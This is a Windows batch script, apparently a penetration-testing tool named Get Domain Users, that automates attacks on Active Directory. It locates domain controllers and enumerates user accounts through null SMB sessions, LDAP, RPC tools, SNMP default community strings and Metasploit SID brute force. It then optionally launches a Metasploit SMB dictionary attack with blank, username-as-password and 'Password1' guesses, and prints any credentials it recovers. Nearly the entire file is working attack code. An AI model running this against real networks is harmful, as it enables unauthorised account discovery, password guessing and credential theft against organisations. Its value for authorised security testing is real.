@ECHO off
CLS

REM #################################################################
REM # Author and Stuff
REM #################################################################
REM # Script Name: Get Domain Users (GDU)
REM # Author: Scott Sutherland (nullbind) <scott.sutherland@netspi.com>
REM #
REM # Description:
REM # This script is intended to automated the following tasks:
REM # 1) Determine domain from IPCONFIG
REM	# 2) Identify domain controllers via DNS
REM # 3) Enumerate users via RCP endpoints with Dumpsec
REM # 4) Enumerate users via RCP endpoints with Enum -U
REM # 5) Enumerate users via RCP endpoints with Enum -N
REM # 6) Enumerate users via RCP SID Brute force with Metasploit
REM # 7) Enumerate users via SNMP default strings with Metasploit
REM # 8) Conduct short dictionary attack against users with Metasploit
REM #
REM # Users can authenticate with one of three options during attack:
REM # 1) Null SMB Login
REM # 2) Trusted connection
REM # 3) Username and password
REM #################################################################


REM -----------------------------------------------------------------
REM TODO
REM -----------------------------------------------------------------
REM WRITE Thoroughness swith (stop at first server that gives data vs all)
REM WRITE POLICY DUMP CODE
REM WRITE POLICY TIMEING INTO DICTIONARY ATTACK
REM Add switch for custom domain
REM Add check for required executables before running
REM -----------------------------------------------------------------


REM -------------------------------------------------------
REM PRE RUN CONFIGURATION OPTIONS
REM -------------------------------------------------------
REM ## SETUP EXECUTABLES PATHS
SET unixtoolspath="C:\unixtools\"
SET metasploitpath="C:\metasploit\"
SET enumpath="C:\Penetration Testing\Enum+\Enum+\enum.exe"
SET dumpsecpath="C:\Program Files (x86)\SystemTools\dumpsec.exe"

REM ## SETUP CUSTOM DOMAIN (NOT ASSOCIATED WITH DHCP)
REM ## Example: SET custom_domain=netspi.local 
SET custom_domain=netspi.local

REM ## SETUP AUTHENTICATION VARIABLES
SET netuse_auth="" /user:""
SET enumauth=

REM ## SETUP COMMAND LINE SWITCHES
IF [%1] equ [] goto :SYNTAX
IF [%1] equ [-n] goto :NULLSESSION
IF [%1] equ [-a] goto :AUTHENTICATE
IF [%1] equ [-t] goto :TRUSTEDCON


:SYNTAX
ECHO ------------------------------------------------------------
ECHO                 GET DOMAIN USERS (GDU)
ECHO ------------------------------------------------------------
ECHO This script can be used to enumerate users that exist
ECHO in the domain associated with the DHCP server.  By default,
ECHO the script will use a null session to attempt to enumerate
ECHO information. 
ECHO ------------------------------------------------------------
ECHO Syntax: 
ECHO -n run the script with null smb login
ECHO -t run the script with a trusted connection (current user)
ECHO -a run script as an authenticated user
ECHO -u user name to authenticate with
ECHO -p password to authenticate with
ECHO ------------------------------------------------------------
ECHO Examples:
ECHO    null connection: gdu -n 							
ECHO trusted connection: gdu -t
ECHO  custom connection: gdu -a -u "domain\user" -p password
GOTO :END

:AUTHENTICATE
IF [%5] equ [] ECHO Missing username or password && goto :END
SET enumauth=-u %3 -p %5
SET netuse_auth=/user:%3 %5
GOTO :NULLSESSION

:TRUSTEDCON
SET netuse_auth=
GOTO :NULLSESSION

:NULLSESSION
REM ## CHECK IF USERS WOULD LIKE TO AUTO EXEC A DICTIONARY ATTACK
ECHO Would you like the dictionary attack to auto execute?
set /p attack=Y/N (default N):
IF %attack% equ N GOTO :DHCP
IF %attack% equ y set attack=Y && GOTO :DHCP
IF %attack% equ Y GOTO :DHCP
SET attack=N && GOTO :DHCP


:DHCP
REM ## DISPLAY BANNER
cls
ECHO ------------------------------------------------------------
ECHO -                                                          -
ECHO -                  GET DOMAIN USERS (GDU)                  -
ECHO -                                                          -
ECHO ------------------------------------------------------------
ECHO                   Enumerating Domain Users                 
ECHO ------------------------------------------------------------
REM -------------------------------------------------------
REM GET CURRENT DOMAIN FROM IPCONFIG DHCP CONFIGURATION
REM -------------------------------------------------------
IF %attack% equ N ECHO  [*]    INFO: Dictionary attack DISABLED
IF %attack% equ Y ECHO  [*]    INFO: Dictionary attack ENABLED
ECHO  [*]  ACTION: Getting domain from DHCP configuration...

REM ## PARSE DOMAIN FROM IPCONFIG
ipconfig | find /I "." |  find /I "Connection-specific DNS Suffix  . : " | gawk -F " " "{print $6}" | find /v " "  | sort | uniq | find /I "."|sed -e "s/^[ \]*//" >target
SET /p target_domain= < target
IF EXIST target del target

REM ## SETUP CUSTOM DOMAIN IF VARIABLE HAS BEEN SET
IF [%target_domain%] equ [] ECHO  [-]  RESULT: FAILED && GOTO :END
ECHO  [*]  RESULT: %target_domain%
IF [%custom_domain%] neq [] SET target_domain=%custom_domain% 

REM ## CHECKING TOTAL NUMBER OF WORDS IN A DOMAIN AND SAVE AS TOTALVAR 
IF EXIST num_words del num_words
echo %target_domain%| gawk  -F "." "{ total = total + NF }; END { print total+0 }" > num_words
SET /p totalvar= < num_words
IF EXIST num_words DEL num_words

REM ## DEFINE DOMAIN PARAMETER TO BE USED LATER (e.g: var1=hacking, var2=lab, var3=local)
IF EXIST domainname del domainname
FOR /L %%G IN (1,1,%totalvar%) DO (echo %target_domain% | gawk -F "." "{print $%%G}" > %%G
SET /p var%%G= < %%G
gawk "BEGIN { while (a++<1) s=s \"dc=%%var%%G%%\"; print s }" >> domainname
DEL %%G )

REM ## PARSING DOMAIN VARIABLES FOR THE domain_parameters (e.g: dc=%var1%,dc=%var2%,dc=%var3%)
IF EXIST domainname_var del domainname_var
gawk "NR==1{x=$0;next}NF{x=x\",\"$0}END{print x}" domainname > domainname_var
DEL domainname

REM ## FIX PARSING ISSUES
IF EXIST domainname_var2 del domainname_var2
SET /p temp_var= < domainname_var
@echo %temp_var% | sed "s/'//" > domainname_var2
SET /p domain_parameter= < domainname_var2
IF EXIST domainname_var DEL domainname_var 
IF EXIST domainname_var2 DEL domainname_var2


REM -------------------------------------------------------
REM ENUMERATE DOMAIN CONTROLLERS WITH NSLOOKUP
REM -------------------------------------------------------
ECHO  [*]  ACTION: Getting list of DCs from DNS...

REM ## ENUMERATE DOMAIN CONTROLLERS
nslookup -type=SRV _ldap._tcp.%target_domain% 2>nul| find /I "internet address" | gawk -F " " "{print $5}" | uniq | sort > dcs.txt 2> NUL 

REM ## GET DOMAIN CONTROLLER COUNT
wc -l dcs.txt | sed s/dcs.txt//g | sed -e "s/^[ \]*//" > dc_count
SET /P dc_count=<dc_count
IF EXIST dc_count del dc_count
if %dc_count% LEQ 0 ECHO  [-]  RESULT: FAILED && GOTO :END

REM ## PRINT NUMBER OF DOMAIN CONTROLLERS
ECHO  [*]  RESULT: Found %dc_count%domain controllers

REM ## PRINT LIST OF DOMAIN CONTROLLERS
for /F "tokens=*" %%i in ('type dcs.txt') do ECHO  [*]      DC: %%i


REM -------------------------------------------------------
REM CREATE SMB SESSION TO DCs WITH NET USE
REM -------------------------------------------------------
REM ## Establish smb login to each domain controller via native net use command
IF [%1] equ [-n] ECHO  [*]  ACTION: Establishing null SMB login to each DC...
IF [%1] equ [-a] ECHO  [*]  ACTION: Establishing authenticated login to each DC as %3...
FOR /F "tokens=*" %%i in ('type dcs.txt') do net use \\%%i\IPC$ %netuse_auth% 1>nul


:LDAP
REM -------------------------------------------------------
REM USER ENUMERATED WITH ADFIND (LDAP)
REM -------------------------------------------------------

REM ## DETERMINE IF LDAP SHOULD BE USED
IF [%1] equ [-n] ECHO  [*]    INFO: LDAP doesn't support null SMB login && GOTO :DUMPSEC
ECHO  [*]  ACTION: Attempting user enumeration with LDAP...

REM ## GET LIST OF USERS & PARSE INTO FILE
@adfind -b %domain_parameter% -f "objectcategory=user" -gc | grep -i "sAMAccountName:" | gawk -F ":" "{print $2}" | gawk -F " " "{print $1}"| gawk "!/\$/"| uniq | sort 2>nul 1> allusers.txt

REM ## GET USER COUNT
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g | uniq>user_count
SET /P user_count=<user_count

REM ## CLEAN UP COUNT FILES
IF EXIST user_count del user_count
IF EXIST allusers.txt move allusers.txt domain_users_ldap.txt 2>nul 1>nul

REM ## CHECK FOR FAILURE
IF %user_count% EQU 0 ECHO  [-]  RESULT: FAILED && GOTO :DUMPSEC

REM ## PRINT NUMBER OF ENUMERATED USERS
ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_ldap.txt)

REM ## IF SUCCSESFUL GOTO NEXT STEP
GOTO :DUMPSEC


:DUMPSEC
REM -------------------------------------------------------
REM USER ENUMERATED WITH DUMPSEC (RPC ENDPOINTS)
REM -------------------------------------------------------
ECHO  [*]  ACTION: Attempting user enumeration via RPC ENDPOINTS(DUMPSEC)...

REM ## GET LIST OF USERS
FOR /F "tokens=*" %%i in ('type dcs.txt') do %dumpsecpath% /computer=\\%%i /rpt=usersonly /saveas=csv /outfile=%%i_usrs.txt 2> nul

REM ## PARSE CLEAN LIST OF USERS
cat *_usrs.txt| gawk -F "," "{print $1}" | find /V "Somarsoft DumpSec"| find /V "NetQueryDisplayInformation"| find /V "UserName" | grep -v "^$" | grep -v "," | sort | uniq > allusers.txt

REM ## REMOVE TEMP FILES
FOR /F "tokens=*" %%i in ('type dcs.txt') do del %%i_usrs.txt

REM ## GET USER COUNT
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count

REM ## REMOVE TEMP FILES
IF EXIST user_count del user_count
IF EXIST allusers.txt move allusers.txt domain_users_rpc_dumpsec.txt 2>nul 1>nul

REM ## CHECK FOR FAILURE
IF %user_count% LEQ 1 ECHO  [-]  RESULT: FAILED && GOTO :ENUMN

REM ## PRINT NUMBER OF ENUMERATED USERS
ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_rpc_dumpsec.txt)

REM ## IF SUCCSESFUL GOTO NEXT STEP
GOTO :ENUMN


:ENUMN
REM -------------------------------------------------------
REM Run enum -N to enumerate users (RPC ENDPOINTS)
REM -------------------------------------------------------
ECHO  [*]  ACTION: Attempting user enumeration via RPC ENDPOINTS(ENUM -N)...

REM ## GET LIST OF USERS
IF [%1] equ [-t] FOR /F "tokens=*" %%i in ('type dcs.txt') do %enumpath% -N %%i >> allusers.txt
IF [%1] equ [-n] FOR /F "tokens=*" %%i in ('type dcs.txt') do %enumpath% -N %enumauth% %%i >> allusers.txt
IF [%1] equ [-a] FOR /F "tokens=*" %%i in ('type dcs.txt') do %enumpath% -N %enumauth% %%i >> allusers.txt

REM ## PARSE CLEAN LIST OF USERS
grep -i "(pass 1)... got" allusers.txt| wc -l | sed -e "s/^[ \]*//" > checkit
SET /P success=<checkit
IF EXIST checkit del checkit
IF %success% EQU 0 ECHO  [-]  RESULT: FAILED && GOTO :SNMPENUM
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $1}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $2}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $3}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $4}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $5}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $6}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $7}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $8}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $9}"  | sort | uniq >> clean.txt
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $10}"  | sort | uniq >> clean.txt
cat clean.txt | grep -v "\$" | grep -v "^$" | grep -v "," |  sed -e "s/^[ \]*//"  | sort | uniq > allusers.txt
IF EXIST clean.txt del clean.txt

REM ## GET USER COUNT
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count

REM ## REMOVE TEMP FILES
IF EXIST user_count del user_count
IF EXIST allusers.txt move allusers.txt domain_users_rpc_enum.txt 2>nul 1>nul

REM ## CHECK FOR FAILURE
IF %user_count% EQU 0 ECHO  [-]  RESULT: FAILED && GOTO :SNMPENUM

REM ## PRINT NUMBER OF ENUMERATED USERS
ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_rpc_enum.txt) 

REM ## IF SUCCSESFUL GOTO NEXT STEP
GOTO :SNMPENUM


:SNMPENUM
REM ----------------------------------------------------------------------
REM ENUMERATE USERS WITH SNMP_ENUMUSERS (SNMP)
REM -----------------------------------------------------------------------
ECHO  [*]  ACTION: Attempting user enumeration via SNMP Public string...

REM ## GET LIST OF USERS
ruby c:\metasploit\msf3\msfcli auxiliary/scanner/snmp/snmp_enumusers COMMUNITY=Public RHOSTS=file:%mypwd%\\dcs.txt E 2> nul 1>> usrtmp.txt

REM ## PARSE CLEAN LIST OF USERS
grep -i "Found Users:" usrtmp.txt | gawk -F "Found Users:" "{print $2}" | tr , \n | sed -e "s/^[ \]*//" | sort | uniq 2>nul 1> allusers.txt

REM ## REMOVE TEMP FILES
IF EXIST usrtmp.txt del usrtmp.txt

REM ## GET NUMBER OF ENUMERATED USERS
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count
IF EXIST user_count del user_count
IF EXIST allusers.txt move allusers.txt domain_users_snmp.txt 2>nul 1>nul

REM ## CHECK FOR FAILURE
if %user_count% LEQ 1 ECHO  [-]  RESULT: FAILED && GOTO :SIDENUM

REM ## PRINT NUMBER OF ENUMERATED USERS
ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_snmp.txt) 

REM ## IF SUCCSESFUL GOTO NEXT STEP
GOTO :SIDENUM


:SIDENUM
REM -------------------------------------------------------
REM ENUMERATE USERS WITH SMB_LOOKUPSID (RPC SID Brute Force)
REM -------------------------------------------------------
ECHO  [*]  ACTION: Attempting user enumeration via RPC SID BF (takes a while)...

REM ## BUILD FILE NAME FILE PATH FOR METASPLOIT VARIABLE
pwd > pwd.txt
cat pwd.txt | sed s/\\/\\\\/g > pwd2.txt
SET /P mypwd=<pwd2.txt
IF EXIST pwd.txt del pwd.txt
IF EXIST pwd2.txt del pwd2.txt

REM ## GET LIST OF USERS
Ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_lookupsid THREADS=15 MaxRID=10000 SMBDomain=. RHOSTS=file:%mypwd%\\dcs.txt E 2> nul 1>> usrtmp.txt

REM ## PARSE CLEAN LIST OF USERS
grep -i "user=" usrtmp.txt | gawk -F " " "{print $3}" | gawk -F "USER=" "{print $2}" | grep -v "\$" |gawk "!/\$/" | sort | uniq 2>nul 1> allusers.txt
IF EXIST usrtmp.txt del usrtmp.txt

REM ## GET NUMBER OF ENUMERATED USERS
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count

REM ## REMOVE TEMP FILES
IF EXIST user_count del user_count
IF EXIST allusers.txt move allusers.txt domain_users_rpc_sidbf.txt 2>nul 1>nul

REM ## CHECK FOR FAILURE
if %user_count% LEQ 1 ECHO  [-]  RESULT: FAILED && GOTO :USERCHECK

REM ## PRINT NUMBER OF ENUMERATED USERS
ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_rpc_sidbf.txt) 

REM ## IF SUCCSESFUL GOTO NEXT STEP
GOTO :USERCHECK


:USERCHECK
REM -------------------------------------------------------
REM VERIFY USERS WHERE ENUMERATED BEFORE ATTACKING
REM -------------------------------------------------------

REM ## DUMP ALL USERS FROM ALL PROTOCOLS INTO allusers.txt
cat domain_users*.txt |sort|uniq > allusers.txt

REM ## GET NUMBER OF USERS ENUMERATED
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count

REM ## REMOVE TEMP FILES
IF EXIST user_count del user_count

REM ## NOTIFY USER IF NO USERS WHERE ENUMERATED
IF %user_count% EQU 0 ECHO  [*]     INFO: No users enumerated && DEL allusers.txt && GOTO :END

REM ## CHECK IF USER WANTS AUTO DICTIONARY ATTACK
IF %attack% equ N GOTO :END

REM ## ATTACK IF USERS WHERE ENUMERATED & Dictionary attack is requested
GOTO :DATTACK


:DATTACK
REM -------------------------------------------------------
REM ATTEMPT DICTIONARY ATTACK AGAINST DC
REM -------------------------------------------------------
ECHO ------------------------------------------------------------
ECHO                   Starting Dictionary Attack 
ECHO ------------------------------------------------------------

REM ## COMBINE USER LISTS
cat domain_users*.txt | sort | uniq 2>nul 1>allusers.txt

REM ## GET NUMBER OF ENUMERATED USERS
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count
SET /P user_count=<user_count

REM ## REMOVE TEMP FILES
IF EXIST user_count del user_count

REM ## GENERATE DICTIONARY FILE FOR ATTACK
REM ## NOTE: Blank password and username as password 
REM ## are default options in the smb_login module
ECHO  [*]  ACTION: Generating password file list...
IF EXIST passwords.txt DEL passwords.txt
touch passwords.txt
ECHO Password1 >> passwords.txt

REM ## Get number of passwords to be used
wc -l passwords.txt | sed -e "s/^[ \]*//" | sed s/passwords.txt//g> pwcount
SET /P pwcount=<pwcount
IF EXIST pwcount del pwcount

REM ## add 2 to pwcount; 1 blank;1 username as pw (built into smb_login)
SET /a pwcount=%pwcount%+2 

REM ## GET PRESENT WORKING DIRECTORY
pwd > pwd.txt
SET /P mydir=<pwd.txt
IF EXIST pwd.txt DEL pwd.txt

REM ## MODIFY PATH FOR METASPLOIT
echo %mydir% | sed s/\\/\\\\/g > pwd.txt
SET /P mydir=<pwd.txt
IF EXIST pwd.txt DEL pwd.txt

REM ## GET TARGET DC
head -n 1 dcs.txt > targetdc.txt
set /p targetdc=<targetdc.txt
IF EXIST targetdc.txt del targetdc.txt

REM ## PRINT DICTIONARY CONFIGURATION INFO
ECHO  [*]  ACTION: %targetdc% loaded as target
ECHO  [*]  ACTION: %pwcount% passwords loaded 
ECHO  [*]  ACTION: %user_count%users loaded
ECHO  [*]  ACTION: Starting dictionary attack (takes a while)...

REM ## EXECUTE DICTIONARY ATTACK
ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=5 BLANK_PASSWORDS=true USER_AS_PASS=true PASS_FILE=%mydir%\\passwords.txt USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2> nul 1> creds.txt

REM # PARSE RECOVERED USERSNAME AND PASSWORDS
grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15 }" > domain_passwords.txt
IF EXIST creds.txt del creds.txt
IF EXIST domain_passwords.txt SET /P creds=< domain_passwords.txt

REM ## GET NUMBER CREDENTIALS
wc -l domain_passwords.txt | sed -e "s/^[ \]*//" | sed s/domain_passwords.txt//g>cred_count
SET /P cred_count=<cred_count

REM ## REMOVE TEMP FILES
IF EXIST cred_count del cred_count

REM ## CHECK FOR FAILURE
IF %cred_count% EQU 0 ECHO  [*]  RESULT: No weak passwords were found && goto :END


REM ## COUNT NUMBER OF CREDETIALS RECOVERED
wc -l domain_passwords.txt > pw_count.txt
SET /P pw_count=<pw_count.txt

REM ## REMOVE TEMP FILES
IF EXIST pw_count.txt del pw_count.txt

REM ## PRINT NUMBER OF CREDETIALS RECOVERED
ECHO  [*]   RESULT: %pw_count% passwords were found

REM ## PRINT CREDENTIALS
FOR /F "tokens=*" %i in ('type domain_passwords.txt') do ECHO  [*]  ACCOUNT:%%i

REM ## ENUMERATE ACTIVE DOMAIN ADMIN SESSIONS
REM authenticate to dc and get full dc list
REM authenticate to dc and get domain/enterprise admins list
REM check if user is domain admin 
REM authenticate as domain user to each dc - net use
REM get session from each dc NetSess.exe -h 192.168.73.25
REM cross referance and spit out list of IPS / domain admins


:END
ECHO ------------------------------------------------------------
REM ## CLEANUP FILES
IF EXIST passwords.txt del passwords.txt
IF EXIST dcs.txt del dcs.txt

REM ## REMOVE PROTOCOL USER ENUMERATION FILES
IF EXIST dcs.txt FOR /F "tokens=*" %%i in ('dir /b domain_user*') do IF EXIST %%i DEL %%i

REM ## CLEAN UP SMB CONNECTIONS
IF EXIST dcs.txt FOR /F "tokens=*" %%i in ('type dcs.txt') do net use \\%%i\IPC$ /del 2>nul 1>nul


:POLICY
REM -------------------------------------------------------
REM Run enum to enumerate account policies
REM -------------------------------------------------------
REM ECHO  [*]  ACTION: Attempting policy enumeration with ENUM...
REM enum "c:\Penetration Testing\Enum+\Enum+\enum.exe" -P %%i >> policy.txt
REM ECHO  [*]  ACTION: Attempting policy enumeration with DUMPSEC...
REM %dumpsecpath% /computer=\\%mydc% /rpt=policy /saveas=csv /outfile=pwpolicy.txt 2> nul
REM grep -i "Lockout after " pwpolicy.txt | sed s/"Lockout after"//g | sed s/"bad logon attempts"//g | sed -e "s/^[ \]*//">lockout
REM IF EXIST pwpolicy.txt del pwpolicy.txt 
REM set /P lockout=<lockout
REM del lockout